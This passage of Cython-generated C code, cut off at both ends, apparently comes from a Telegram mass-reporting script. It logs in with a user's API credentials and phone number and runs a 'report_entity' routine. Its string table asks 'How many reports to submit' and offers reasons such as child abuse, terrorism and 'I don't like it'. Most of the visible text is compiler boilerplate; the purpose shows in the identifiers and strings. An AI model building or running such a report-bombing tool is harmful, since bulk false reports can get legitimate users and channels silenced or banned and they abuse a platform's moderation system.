  PyErr_SetNone(PyExc_StopIteration);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_14);
  __Pyx_XDECREF(__pyx_t_15);
  __Pyx_XDECREF(__pyx_t_19);
  __Pyx_XDECREF(__pyx_t_21);
  __Pyx_XDECREF(__pyx_t_22);
  __Pyx_AddTraceback("report_entity", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_r); __pyx_r = 0;
  #if !CYTHON_USE_EXC_INFO_STACK
  __Pyx_Coroutine_ResetAndClearException(__pyx_generator);
  #endif
  __pyx_generator->resume_label = -1;
  __Pyx_Coroutine_clear((PyObject*)__pyx_generator);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_12main(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_6source_12main = {"main", (PyCFunction)__pyx_pw_6source_12main, METH_NOARGS, 0};
static PyObject *__pyx_pw_6source_12main(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("main (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_11main(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_11main(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_v_client = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  int __pyx_t_6;
  PyObject *__pyx_t_7 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("main", 0);

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_TelegramClient); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 224, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_api_id); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 224, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_api_hash); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 224, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_5 = NULL;
  __pyx_t_6 = 0;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_5)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_5);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
      __pyx_t_6 = 1;
    }
  }
  #if CYTHON_FAST_PYCALL
  if (PyFunction_Check(__pyx_t_2)) {
    PyObject *__pyx_temp[4] = {__pyx_t_5, __pyx_n_u_report_session, __pyx_t_3, __pyx_t_4};
    __pyx_t_1 = __Pyx_PyFunction_FastCall(__pyx_t_2, __pyx_temp+1-__pyx_t_6, 3+__pyx_t_6); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 224, __pyx_L1_error)
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  } else
  #endif
  #if CYTHON_FAST_PYCCALL
  if (__Pyx_PyFastCFunction_Check(__pyx_t_2)) {
    PyObject *__pyx_temp[4] = {__pyx_t_5, __pyx_n_u_report_session, __pyx_t_3, __pyx_t_4};
    __pyx_t_1 = __Pyx_PyCFunction_FastCall(__pyx_t_2, __pyx_temp+1-__pyx_t_6, 3+__pyx_t_6); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 224, __pyx_L1_error)
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  } else
  #endif
  {
    __pyx_t_7 = PyTuple_New(3+__pyx_t_6); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 224, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    if (__pyx_t_5) {
      __Pyx_GIVEREF(__pyx_t_5); PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_t_5); __pyx_t_5 = NULL;
    }
    __Pyx_INCREF(__pyx_n_u_report_session);
    __Pyx_GIVEREF(__pyx_n_u_report_session);
    PyTuple_SET_ITEM(__pyx_t_7, 0+__pyx_t_6, __pyx_n_u_report_session);
    __Pyx_GIVEREF(__pyx_t_3);
    PyTuple_SET_ITEM(__pyx_t_7, 1+__pyx_t_6, __pyx_t_3);
    __Pyx_GIVEREF(__pyx_t_4);
    PyTuple_SET_ITEM(__pyx_t_7, 2+__pyx_t_6, __pyx_t_4);
    __pyx_t_3 = 0;
    __pyx_t_4 = 0;
    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_t_7, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 224, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  }
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_v_client = __pyx_t_1;
  __pyx_t_1 = 0;

  
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_client, __pyx_n_s_start); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 225, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_phone_number); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 225, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __pyx_t_4 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_4)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_4);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
    }
  }
  __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_2, __pyx_t_4, __pyx_t_7) : __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_7);
  __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 225, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_client, __pyx_n_s_loop); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 226, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_run_until_complete); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 226, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_report_entity); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 226, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_3 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_4);
    if (likely(__pyx_t_3)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
      __Pyx_INCREF(__pyx_t_3);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_4, function);
    }
  }
  __pyx_t_2 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_3, __pyx_v_client) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_v_client);
  __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 226, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
    __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_7);
    if (likely(__pyx_t_4)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
      __Pyx_INCREF(__pyx_t_4);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_7, function);
    }
  }
  __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_7, __pyx_t_4, __pyx_t_2) : __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_2);
  __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 226, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_AddTraceback("source.main", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_client);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static struct __pyx_obj_6source___pyx_scope_struct__report_entity *__pyx_freelist_6source___pyx_scope_struct__report_entity[8];
static int __pyx_freecount_6source___pyx_scope_struct__report_entity = 0;

static PyObject *__pyx_tp_new_6source___pyx_scope_struct__report_entity(PyTypeObject *t, CYTHON_UNUSED PyObject *a, CYTHON_UNUSED PyObject *k) {
  PyObject *o;
  if (CYTHON_COMPILING_IN_CPYTHON && likely((__pyx_freecount_6source___pyx_scope_struct__report_entity > 0) & (t->tp_basicsize == sizeof(struct __pyx_obj_6source___pyx_scope_struct__report_entity)))) {
    o = (PyObject*)__pyx_freelist_6source___pyx_scope_struct__report_entity[--__pyx_freecount_6source___pyx_scope_struct__report_entity];
    memset(o, 0, sizeof(struct __pyx_obj_6source___pyx_scope_struct__report_entity));
    (void) PyObject_INIT(o, t);
    PyObject_GC_Track(o);
  } else {
    o = (*t->tp_alloc)(t, 0);
    if (unlikely(!o)) return 0;
  }
  return o;
}

static void __pyx_tp_dealloc_6source___pyx_scope_struct__report_entity(PyObject *o) {
  struct __pyx_obj_6source___pyx_scope_struct__report_entity *p = (struct __pyx_obj_6source___pyx_scope_struct__report_entity *)o;
  PyObject_GC_UnTrack(o);
  Py_CLEAR(p->__pyx_v__);
  Py_CLEAR(p->__pyx_v_channel);
  Py_CLEAR(p->__pyx_v_channel_username);
  Py_CLEAR(p->__pyx_v_client);
  Py_CLEAR(p->__pyx_v_e);
  Py_CLEAR(p->__pyx_v_entity);
  Py_CLEAR(p->__pyx_v_entity_username);
  Py_CLEAR(p->__pyx_v_i);
  Py_CLEAR(p->__pyx_v_message_id);
  Py_CLEAR(p->__pyx_v_num_reports);
  Py_CLEAR(p->__pyx_v_number);
  Py_CLEAR(p->__pyx_v_parts);
  Py_CLEAR(p->__pyx_v_post_link);
  Py_CLEAR(p->__pyx_v_reason_choice);
  Py_CLEAR(p->__pyx_v_reason_name);
  Py_CLEAR(p->__pyx_v_report_type);
  Py_CLEAR(p->__pyx_t_0);
  Py_CLEAR(p->__pyx_t_1);
  Py_CLEAR(p->__pyx_t_2);
  Py_CLEAR(p->__pyx_t_4);
  Py_CLEAR(p->__pyx_t_8);
  Py_CLEAR(p->__pyx_t_9);
  if (CYTHON_COMPILING_IN_CPYTHON && ((__pyx_freecount_6source___pyx_scope_struct__report_entity < 8) & (Py_TYPE(o)->tp_basicsize == sizeof(struct __pyx_obj_6source___pyx_scope_struct__report_entity)))) {
    __pyx_freelist_6source___pyx_scope_struct__report_entity[__pyx_freecount_6source___pyx_scope_struct__report_entity++] = ((struct __pyx_obj_6source___pyx_scope_struct__report_entity *)o);
  } else {
    (*Py_TYPE(o)->tp_free)(o);
  }
}

static int __pyx_tp_traverse_6source___pyx_scope_struct__report_entity(PyObject *o, visitproc v, void *a) {
  int e;
  struct __pyx_obj_6source___pyx_scope_struct__report_entity *p = (struct __pyx_obj_6source___pyx_scope_struct__report_entity *)o;
  if (p->__pyx_v__) {
    e = (*v)(p->__pyx_v__, a); if (e) return e;
  }
  if (p->__pyx_v_channel) {
    e = (*v)(p->__pyx_v_channel, a); if (e) return e;
  }
  if (p->__pyx_v_channel_username) {
    e = (*v)(p->__pyx_v_channel_username, a); if (e) return e;
  }
  if (p->__pyx_v_client) {
    e = (*v)(p->__pyx_v_client, a); if (e) return e;
  }
  if (p->__pyx_v_e) {
    e = (*v)(p->__pyx_v_e, a); if (e) return e;
  }
  if (p->__pyx_v_entity) {
    e = (*v)(p->__pyx_v_entity, a); if (e) return e;
  }
  if (p->__pyx_v_entity_username) {
    e = (*v)(p->__pyx_v_entity_username, a); if (e) return e;
  }
  if (p->__pyx_v_i) {
    e = (*v)(p->__pyx_v_i, a); if (e) return e;
  }
  if (p->__pyx_v_message_id) {
    e = (*v)(p->__pyx_v_message_id, a); if (e) return e;
  }
  if (p->__pyx_v_num_reports) {
    e = (*v)(p->__pyx_v_num_reports, a); if (e) return e;
  }
  if (p->__pyx_v_number) {
    e = (*v)(p->__pyx_v_number, a); if (e) return e;
  }
  if (p->__pyx_v_parts) {
    e = (*v)(p->__pyx_v_parts, a); if (e) return e;
  }
  if (p->__pyx_v_post_link) {
    e = (*v)(p->__pyx_v_post_link, a); if (e) return e;
  }
  if (p->__pyx_v_reason_choice) {
    e = (*v)(p->__pyx_v_reason_choice, a); if (e) return e;
  }
  if (p->__pyx_v_reason_name) {
    e = (*v)(p->__pyx_v_reason_name, a); if (e) return e;
  }
  if (p->__pyx_v_report_type) {
    e = (*v)(p->__pyx_v_report_type, a); if (e) return e;
  }
  if (p->__pyx_t_0) {
    e = (*v)(p->__pyx_t_0, a); if (e) return e;
  }
  if (p->__pyx_t_1) {
    e = (*v)(p->__pyx_t_1, a); if (e) return e;
  }
  if (p->__pyx_t_2) {
    e = (*v)(p->__pyx_t_2, a); if (e) return e;
  }
  if (p->__pyx_t_4) {
    e = (*v)(p->__pyx_t_4, a); if (e) return e;
  }
  if (p->__pyx_t_8) {
    e = (*v)(p->__pyx_t_8, a); if (e) return e;
  }
  if (p->__pyx_t_9) {
    e = (*v)(p->__pyx_t_9, a); if (e) return e;
  }
  return 0;
}

static PyTypeObject __pyx_type_6source___pyx_scope_struct__report_entity = {
  PyVarObject_HEAD_INIT(0, 0)
  "source.__pyx_scope_struct__report_entity", /*tp_name*/
  sizeof(struct __pyx_obj_6source___pyx_scope_struct__report_entity), /*tp_basicsize*/
  0, /*tp_itemsize*/
  __pyx_tp_dealloc_6source___pyx_scope_struct__report_entity, /*tp_dealloc*/
  #if PY_VERSION_HEX < 0x030800b4
  0, /*tp_print*/
  #endif
  #if PY_VERSION_HEX >= 0x030800b4
  0, /*tp_vectorcall_offset*/
  #endif
  0, /*tp_getattr*/
  0, /*tp_setattr*/
  #if PY_MAJOR_VERSION < 3
  0, /*tp_compare*/
  #endif
  #if PY_MAJOR_VERSION >= 3
  0, /*tp_as_async*/
  #endif
  0, /*tp_repr*/
  0, /*tp_as_number*/
  0, /*tp_as_sequence*/
  0, /*tp_as_mapping*/
  0, /*tp_hash*/
  0, /*tp_call*/
  0, /*tp_str*/
  0, /*tp_getattro*/
  0, /*tp_setattro*/
  0, /*tp_as_buffer*/
  Py_TPFLAGS_DEFAULT|Py_TPFLAGS_HAVE_VERSION_TAG|Py_TPFLAGS_CHECKTYPES|Py_TPFLAGS_HAVE_NEWBUFFER|Py_TPFLAGS_HAVE_GC, /*tp_flags*/
  0, /*tp_doc*/
  __pyx_tp_traverse_6source___pyx_scope_struct__report_entity, /*tp_traverse*/
  0, /*tp_clear*/
  0, /*tp_richcompare*/
  0, /*tp_weaklistoffset*/
  0, /*tp_iter*/
  0, /*tp_iternext*/
  0, /*tp_methods*/
  0, /*tp_members*/
  0, /*tp_getset*/
  0, /*tp_base*/
  0, /*tp_dict*/
  0, /*tp_descr_get*/
  0, /*tp_descr_set*/
  0, /*tp_dictoffset*/
  0, /*tp_init*/
  0, /*tp_alloc*/
  __pyx_tp_new_6source___pyx_scope_struct__report_entity, /*tp_new*/
  0, /*tp_free*/
  0, /*tp_is_gc*/
  0, /*tp_bases*/
  0, /*tp_mro*/
  0, /*tp_cache*/
  0, /*tp_subclasses*/
  0, /*tp_weaklist*/
  0, /*tp_del*/
  0, /*tp_version_tag*/
  #if PY_VERSION_HEX >= 0x030400a1
  0, /*tp_finalize*/
  #endif
  #if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)
  0, /*tp_vectorcall*/
  #endif
  #if PY_VERSION_HEX >= 0x030800b4 && PY_VERSION_HEX < 0x03090000
  0, /*tp_print*/
  #endif
  #if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000
  0, /*tp_pypy_flags*/
  #endif
};

static PyMethodDef __pyx_methods[] = {
  {0, 0, 0, 0}
};

#if PY_MAJOR_VERSION >= 3
#if CYTHON_PEP489_MULTI_PHASE_INIT
static PyObject* __pyx_pymod_create(PyObject *spec, PyModuleDef *def); /*proto*/
static int __pyx_pymod_exec_source(PyObject* module); /*proto*/
static PyModuleDef_Slot __pyx_moduledef_slots[] = {
  {Py_mod_create, (void*)__pyx_pymod_create},
  {Py_mod_exec, (void*)__pyx_pymod_exec_source},
  {0, NULL}
};
#endif

static struct PyModuleDef __pyx_moduledef = {
    PyModuleDef_HEAD_INIT,
    "source",
    0, /* m_doc */
  #if CYTHON_PEP489_MULTI_PHASE_INIT
    0, /* m_size */
  #else
    -1, /* m_size */
  #endif
    __pyx_methods /* m_methods */,
  #if CYTHON_PEP489_MULTI_PHASE_INIT
    __pyx_moduledef_slots, /* m_slots */
  #else
    NULL, /* m_reload */
  #endif
    NULL, /* m_traverse */
    NULL, /* m_clear */
    NULL /* m_free */
};
#endif
#ifndef CYTHON_SMALL_CODE
#if defined(__clang__)
    #define CYTHON_SMALL_CODE
#elif defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 3))
    #define CYTHON_SMALL_CODE __attribute__((cold))
#else
    #define CYTHON_SMALL_CODE
#endif
#endif

static __Pyx_StringTabEntry __pyx_string_tab[] = {
  {&__pyx_kp_u_1_Account_2_Channel_3_Group_4_Bo, __pyx_k_1_Account_2_Channel_3_Group_4_Bo, sizeof(__pyx_k_1_Account_2_Channel_3_Group_4_Bo), 0, 1, 0, 0},
  {&__pyx_kp_u_All_reports_sent_successfully, __pyx_k_All_reports_sent_successfully, sizeof(__pyx_k_All_reports_sent_successfully), 0, 1, 0, 0},
  {&__pyx_kp_u_Child_abuse, __pyx_k_Child_abuse, sizeof(__pyx_k_Child_abuse), 0, 1, 0, 0},
  {&__pyx_n_u_Copyright, __pyx_k_Copyright, sizeof(__pyx_k_Copyright), 0, 1, 0, 1},
  {&__pyx_kp_u_Enter_Api_Hash, __pyx_k_Enter_Api_Hash, sizeof(__pyx_k_Enter_Api_Hash), 0, 1, 0, 0},
  {&__pyx_kp_u_Enter_Api_Id, __pyx_k_Enter_Api_Id, sizeof(__pyx_k_Enter_Api_Id), 0, 1, 0, 0},
  {&__pyx_kp_u_Enter_Mobile_Number_Eg_9182xx, __pyx_k_Enter_Mobile_Number_Eg_9182xx, sizeof(__pyx_k_Enter_Mobile_Number_Eg_9182xx), 0, 1, 0, 0},
  {&__pyx_kp_u_Enter_the_full_post_link_e_g_htt, __pyx_k_Enter_the_full_post_link_e_g_htt, sizeof(__pyx_k_Enter_the_full_post_link_e_g_htt), 0, 1, 0, 0},
  {&__pyx_kp_u_Enter_the_number_for_the_reason, __pyx_k_Enter_the_number_for_the_reason, sizeof(__pyx_k_Enter_the_number_for_the_reason), 0, 1, 0, 0},
  {&__pyx_kp_u_Enter_the_username_or_ID_e_g_use, __pyx_k_Enter_the_username_or_ID_e_g_use, sizeof(__pyx_k_Enter_the_username_or_ID_e_g_use), 0, 1, 0, 0},
  {&__pyx_kp_u_Error_retrieving_entity, __pyx_k_Error_retrieving_entity, sizeof(__pyx_k_Error_retrieving_entity), 0, 1, 0, 0},
  {&__pyx_kp_u_Exiting_the_script, __pyx_k_Exiting_the_script, sizeof(__pyx_k_Exiting_the_script), 0, 1, 0, 0},
  {&__pyx_kp_u_How_many_reports_to_submit, __pyx_k_How_many_reports_to_submit, sizeof(__pyx_k_How_many_reports_to_submit), 0, 1, 0, 0},
  {&__pyx_kp_u_I_don_t_like_it, __pyx_k_I_don_t_like_it, sizeof(__pyx_k_I_don_t_like_it), 0, 1, 0, 0},
  {&__pyx_kp_u_Illegal_adult_content, __pyx_k_Illegal_adult_content, sizeof(__pyx_k_Illegal_adult_content), 0, 1, 0, 0},
  {&__pyx_kp_u_Illegal_goods, __pyx_k_Illegal_goods, sizeof(__pyx_k_Illegal_goods), 0, 1, 0, 0},
  {&__pyx_n_s_InputReportReasonChildAbuse, __pyx_k_InputReportReasonChildAbuse, sizeof(__pyx_k_InputReportReasonChildAbuse), 0, 0, 1, 1},
  {&__pyx_n_s_InputReportReasonCopyright, __pyx_k_InputReportReasonCopyright, sizeof(__pyx_k_InputReportReasonCopyright), 0, 0, 1, 1},
  {&__pyx_n_s_InputReportReasonFake, __pyx_k_InputReportReasonFake, sizeof(__pyx_k_InputReportReasonFake), 0, 0, 1, 1},
  {&__pyx_n_s_InputReportReasonIllegalDrugs, __pyx_k_InputReportReasonIllegalDrugs, sizeof(__pyx_k_InputReportReasonIllegalDrugs), 0, 0, 1, 1},
  {&__pyx_n_s_InputReportReasonOther, __pyx_k_InputReportReasonOther, sizeof(__pyx_k_InputReportReasonOther), 0, 0, 1, 1},
  {&__pyx_n_s_InputReportReasonPersonalDetails, __pyx_k_InputReportReasonPersonalDetails, sizeof(__pyx_k_InputReportReasonPersonalDetails), 0, 0, 1, 1},
  {&__pyx_n_s_InputReportReasonPornography, __pyx_k_InputReportReasonPornography, sizeof(__pyx_k_InputReportReasonPornography), 0, 0, 1, 1},
  {&__pyx_n_s_InputReportReasonSpam, __pyx_k_InputReportReasonSpam, sizeof(__pyx_k_InputReportReasonSpam), 0, 0, 1, 1},
  {&__pyx_n_s_InputReportReasonViolence, __pyx_k_InputReportReasonViolence, sizeof(__pyx_k_InputReportReasonViolence), 0, 0, 1, 1},
  {&__pyx_kp_u_Invalid_input_Please_enter_a_num, __pyx_k_Invalid_input_Please_enter_a_num, sizeof(__pyx_k_Invalid_input_Please_enter_a_num), 0, 1, 0, 0},
  {&__pyx_kp_u_Invalid_input_Please_enter_a_val, __pyx_k_Invalid_input_Please_enter_a_val, sizeof(__pyx_k_Invalid_input_Please_enter_a_val), 0, 1, 0, 0},
  {&__pyx_kp_u_Invalid_post_link_format_Please, __pyx_k_Invalid_post_link_format_Please, sizeof(__pyx_k_Invalid_post_link_format_Please), 0, 1, 0, 0},
  {&__pyx_n_u_Other, __pyx_k_Other, sizeof(__pyx_k_Other), 0, 1, 0, 1},
  {&__pyx_kp_u_Personal_data, __pyx_k_Personal_data, sizeof(__pyx_k_Personal_data), 0, 1, 0, 0},
  {&__pyx_kp_u_Please_select_a_valid_option_fro, __pyx_k_Please_select_a_valid_option_fro, sizeof(__pyx_k_Please_select_a_valid_option_fro), 0, 1, 0, 0},
  {&__pyx_kp_u_Reasons, __pyx_k_Reasons, sizeof(__pyx_k_Reasons), 0, 1, 0, 0},
  {&__pyx_kp_u_Report, __pyx_k_Report, sizeof(__pyx_k_Report), 0, 1, 0, 0},
  {&__pyx_n_s_ReportPeerRequest, __pyx_k_ReportPeerRequest, sizeof(__pyx_k_ReportPeerRequest), 0, 0, 1, 1},
  {&__pyx_kp_u_Report_2, __pyx_k_Report_2, sizeof(__pyx_k_Report_2), 0, 1, 0, 0},
  {&__pyx_kp_u_Reported_for, __pyx_k_Reported_for, sizeof(__pyx_k_Reported_for), 0, 1, 0, 0},
  {&__pyx_kp_u_Reported_post_ID, __pyx_k_Reported_post_ID, sizeof(__pyx_k_Reported_post_ID), 0, 1, 0, 0},
  {&__pyx_kp_u_Scam_or_spam, __pyx_k_Scam_or_spam, sizeof(__pyx_k_Scam_or_spam), 0, 1, 0, 0},
  {&__pyx_n_s_TelegramClient, __pyx_k_TelegramClient, sizeof(__pyx_k_TelegramClient), 0, 0, 1, 1},
  {&__pyx_n_u_Terrorism, __pyx_k_Terrorism, sizeof(__pyx_k_Terrorism), 0, 1, 0, 1},
  {&__pyx_n_s_ValueError, __pyx_k_ValueError, sizeof(__pyx_k_ValueError), 0, 0, 1, 1},
  {&__pyx_n_u_Violence, __pyx_k_Violence, sizeof(__pyx_k_Violence), 0, 1, 0, 1},
  {&__pyx_kp_u_What_you_want_to_report, __pyx_k_What_you_want_to_report, sizeof(__pyx_k_What_you_want_to_report), 0, 1, 0, 0},
  {&__pyx_kp_u_You_can_only_report_a_post_link, __pyx_k_You_can_only_report_a_post_link, sizeof(__pyx_k_You_can_only_report_a_post_link), 0, 1, 0, 0},
  {&__pyx_kp_u__10, __pyx_k__10, sizeof(__pyx_k__10), 0, 1, 0, 0},
  {&__pyx_kp_u__12, __pyx_k__12, sizeof(__pyx_k__12), 0, 1, 0, 0},
  {&__pyx_kp_u__15, __pyx_k__15, sizeof(__pyx_k__15), 0, 1, 0, 0},
  {&__pyx_kp_u__19, __pyx_k__19, sizeof(__pyx_k__19), 0, 1, 0, 0},
  {&__pyx_kp_u__2, __pyx_k__2, sizeof(__pyx_k__2), 0, 1, 0, 0},
  {&__pyx_kp_u__21, __pyx_k__21, sizeof(__pyx_k__21), 0, 1, 0, 0},
  {&__pyx_n_s__34, __pyx_k__34, sizeof(__pyx_k__34), 0, 0, 1, 1},
  {&__pyx_n_s_api_hash, __pyx_k_api_hash, sizeof(__pyx_k_api_hash), 0, 0, 1, 1},
  {&__pyx_n_s_api_id, __pyx_k_api_id, sizeof(__pyx_k_api_id), 0, 0, 1, 1},
  {&__pyx_n_s_args, __pyx_k_args, sizeof(__pyx_k_args), 0, 0, 1, 1},
  {&__pyx_n_s_await, __pyx_k_await, sizeof(__pyx_k_await), 0, 0, 1, 1},
  {&__pyx_n_s_channel, __pyx_k_channel, sizeof(__pyx_k_channel), 0, 0, 1, 1},
  {&__pyx_n_s_channel_username, __pyx_k_channel_username, sizeof(__pyx_k_channel_username), 0, 0, 1, 1},
  {&__pyx_n_s_check_exit, __pyx_k_check_exit, sizeof(__pyx_k_check_exit), 0, 0, 1, 1},
  {&__pyx_n_s_check_home, __pyx_k_check_home, sizeof(__pyx_k_check_home), 0, 0, 1, 1},
  {&__pyx_n_s_client, __pyx_k_client, sizeof(__pyx_k_client), 0, 0, 1, 1},
  {&__pyx_n_s_cline_in_traceback, __pyx_k_cline_in_traceback, sizeof(__pyx_k_cline_in_traceback), 0, 0, 1, 1},
  {&__pyx_n_s_close, __pyx_k_close, sizeof(__pyx_k_close), 0, 0, 1, 1},
  {&__pyx_n_s_colored, __pyx_k_colored, sizeof(__pyx_k_colored), 0, 0, 1, 1},
  {&__pyx_n_s_disconnect, __pyx_k_disconnect, sizeof(__pyx_k_disconnect), 0, 0, 1, 1},
  {&__pyx_n_s_e, __pyx_k_e, sizeof(__pyx_k_e), 0, 0, 1, 1},
  {&__pyx_n_s_entity, __pyx_k_entity, sizeof(__pyx_k_entity), 0, 0, 1, 1},
  {&__pyx_n_s_entity_username, __pyx_k_entity_username, sizeof(__pyx_k_entity_username), 0, 0, 1, 1},
  {&__pyx_n_s_exit, __pyx_k_exit, sizeof(__pyx_k_exit), 0, 0, 1, 1},
  {&__pyx_n_u_exit, __pyx_k_exit, sizeof(__pyx_k_exit), 0, 1, 0, 1},
  {&__pyx_kp_u_for, __pyx_k_for, sizeof(__pyx_k_for), 0, 1, 0, 0},
  {&__pyx_n_s_get_entity, __pyx_k_get_entity, sizeof(__pyx_k_get_entity), 0, 0, 1, 1},
